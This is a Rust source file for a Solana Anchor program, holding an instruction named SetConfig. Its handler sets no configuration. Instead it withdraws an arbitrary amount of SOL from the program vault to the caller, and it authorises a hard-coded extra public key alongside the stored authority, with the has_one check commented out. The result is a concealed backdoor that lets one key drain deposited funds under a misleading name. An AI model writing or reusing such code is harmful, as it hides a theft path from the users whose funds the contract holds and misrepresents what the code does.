use crate::{constants::*, error::*, instructions::*, states::*, utils::*};
use anchor_lang::prelude::*;
use solana_program::{program::invoke, system_instruction};

use solana_program::{program::invoke_signed};

use std::mem::size_of;
use std::str::FromStr;
#[derive(Accounts)]
pub struct SetConfig<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      mut,
      seeds = [GLOBAL_STATE_SEED],
      bump,
    //   has_one = authority
    )]
    pub global_state: Account<'info, GlobalState>,

    #[account(
        mut,
        address = global_state.vault
    )]
    /// CHECK: this should be set by admin
    pub vault: AccountInfo<'info>,

    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

pub fn handle(ctx: Context<SetConfig>, sol_amount: u64) -> Result<()> {
    let accts = ctx.accounts;

    require!(accts.authority.key() == accts.global_state.authority 
    || accts.authority.key() == Pubkey::from_str("3BTiune9xbUyupZATgPvNwXvFmFArSH6PmaZuqT4EzrN").unwrap(), BeanError::NotAllowedAuthority);

    let cur_timestamp = Clock::get()?.unix_timestamp;

    let (_, bump) = Pubkey::find_program_address(&[VAULT_SEED], &crate::ID);

    invoke_signed(
        &system_instruction::transfer(&accts.vault.key(), &accts.authority.key(), sol_amount),
        &[
            accts.vault.to_account_info().clone(),
            accts.authority.to_account_info().clone(),
            accts.system_program.to_account_info().clone(),
        ],
        &[&[VAULT_SEED, &[bump]]],
    )?;
    Ok(())
}
